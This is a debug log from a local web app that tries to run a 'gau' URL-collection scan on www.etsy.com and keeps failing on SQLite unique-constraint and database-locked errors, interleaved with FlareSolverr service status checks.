2025-06-05 23:46:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:38] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:46:41 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:46:41 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:46:41 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:41 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:41 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:41.826297')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:41 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:41.826297')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:42 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:42 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:42 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:42.327403')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:42 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:42.327403')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:43 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:43 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:43 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:43.328608')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:43 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:43.328608')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:43 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:43.328608')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:43 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:43.328608')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:43] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-05 23:46:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:45] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:46:45 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:46:45 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:46:45 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:46:45 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:46:45 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:46:45 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:46:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:45] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:46:54 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 23:46:54 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 23:46:54 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 23:46:54 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 23:46:54 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 23:46:54 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 23:46:54 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 23:46:54 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 23:46:54 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 23:46:54 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 23:46:54 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 23:46:54 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-05 23:46:54 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-05 23:46:56 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:46:56 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:46:56 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:56 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:56 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:56.191975')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:56 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:56.191975')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:56 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:56 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:56 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:56.693765')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:56 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:56.693765')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:57 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:57 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:46:57 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:57.695130')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:57 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:57.695130')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:57 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:57.695130')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:57 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:46:57.695130')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:46:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:57] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-05 23:46:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:59] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:46:59 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:46:59 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:46:59 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:46:59 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:46:59 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:46:59 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:46:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:59] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:47:00 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:47:00 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:47:00 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:00 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:00 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:00.199591')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:00 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:00.199591')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:00 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:00 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:00 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:00.701609')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:00 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:00.701609')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:01 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:01 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:01 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:01.702906')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:01 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:01.702906')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:01 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:01.702906')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:01 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:01.702906')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:47:01] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-05 23:47:05 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:47:05 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:47:05 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:05 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:05 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:05.252688')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:05 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:05.252688')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:05 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:05 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:05 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:05.753899')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:05 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:05.753899')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:06 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:06 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:47:06 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:06.755099')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:06 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:06.755099')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:06 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:06.755099')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:06 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:47:06.755099')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:47:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:47:06] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-05 23:47:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:47:29] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:48:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:48:30] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:49:12 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:49:12 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:49:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:12] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 23:49:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:12] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 23:49:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:12] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:49:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:12] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 23:49:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:12] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:49:12 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:49:12 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:49:12 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:49:12 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:49:12 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:49:12 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:49:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:12] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:49:22 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:49:22 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:49:22 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:49:22 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:49:27 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:49:22.708135')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 23:49:27 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.OperationalError) database is locked
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:49:22.708135')]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-05 23:49:28 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:49:28 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:49:30 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:49:28.230640')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:49:30 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:49:28.230640')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:49:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:31] "GET /api/flaresolverr/status HTTP/1.1" 200 -
